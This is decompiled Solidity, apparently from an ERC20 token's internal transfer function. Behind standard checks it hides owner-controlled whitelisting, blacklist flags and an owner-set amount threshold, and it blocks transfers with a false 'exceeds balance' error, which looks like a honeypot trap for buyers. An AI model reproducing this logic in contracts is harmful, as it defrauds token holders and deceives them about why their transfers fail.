function 0xcfe(uint256 varg0, uint256 varg1, uint256 varg2) private { 

    v0 = v1 = owner_b_0_19 == __owner;

    if (v1) {

        v0 = v2 = __owner == address(varg2);

    }

    if (!v0) {

        v3 = v4 = __owner == address(varg2);

        if (__owner != address(varg2)) {

            v3 = v5 = owner_b_0_19 == address(varg2);

        }

        if (!v3) {

            v3 = v6 = __owner == address(varg1);

        }

        if (!v3) {

            v7 = address(varg2);

            if (0xff & owner_1[v7] != 1) {

                v8 = address(varg2);

                if (1 != 0xff & owner_2[v8]) {

                    if (varg0 >= stor_3) {

                        v9 = v10 = owner_b_0_19 == address(varg2);

                        if (owner_b_0_19 != address(varg2)) {

                            v9 = v11 = stor_c_0_19 == address(varg1);

                        }

                        require(v9, Error('ERC20: transfer amount exceeds balance'));

                        require(address(varg2), Error('ERC20: transfer from the zero address'));

                        require(address(varg1), Error('ERC20: transfer to the zero address'));

                        v12 = new struct(3);

                        v12.word0 = 38;

                        v13 = address(varg2);

                        v14 = _SafeSub(v12, varg0, _balanceOf[v13]);

                        v15 = address(varg2);

                        _balanceOf[v15] = v14;

                        v16 = address(varg1);

                        v17 = varg0 + _balanceOf[v16];

                        require(v17 >= _balanceOf[v16], Error('SafeMath: addition overflow'));

                        v18 = address(varg1);

                        _balanceOf[v18] = v17;

                        emit Transfer(address(varg2), v18, varg0);

                    } else if (owner_b_0_19 == address(varg1)) {

                        v19 = address(varg2);

                        owner_2[v19] = 0x1 | ~0xff & owner_2[v19];

                        owner_2[v19] = ~0xff & owner_2[v19];

                        require(address(varg2), Error('ERC20: transfer from the zero address'));

                    }

                } else {

                    v20 = v21 = owner_b_0_19 == address(varg2);

                    if (owner_b_0_19 != address(varg2)) {

                        v20 = v22 = stor_c_0_19 == address(varg1);

                    }

                    require(v20, Error('ERC20: transfer amount exceeds balance'));

                }

            } else {

                require(address(varg2), Error('ERC20: transfer from the zero address'));

            }

        } else {

            v23 = v24 = __owner == address(varg2);

            if (v24) {

                v23 = v25 = address(varg2) == address(varg1);

            }

            if (v23) {

                stor_3 = varg0;

            }

        }

        require(address(varg2), Error('ERC20: transfer from the zero address'));

    } else {

        owner_b_0_19 = varg1;

        require(address(varg2), Error('ERC20: transfer from the zero address'));

    }

    require(address(varg1), Error('ERC20: transfer to the zero address'));

    v26 = new struct(3);

    v26.word0 = 38;

    v27 = address(varg2);

    v28 = _SafeSub(v26, varg0, _balanceOf[v27]);

    v29 = address(varg2);

    _balanceOf[v29] = v28;

    v30 = address(varg1);

    v31 = varg0 + _balanceOf[v30];

    require(v31 >= _balanceOf[v30], Error('SafeMath: addition overflow'));

    v32 = address(varg1);

    _balanceOf[v32] = v31;

    emit Transfer(address(varg2), v32, varg0);

    return ;

}
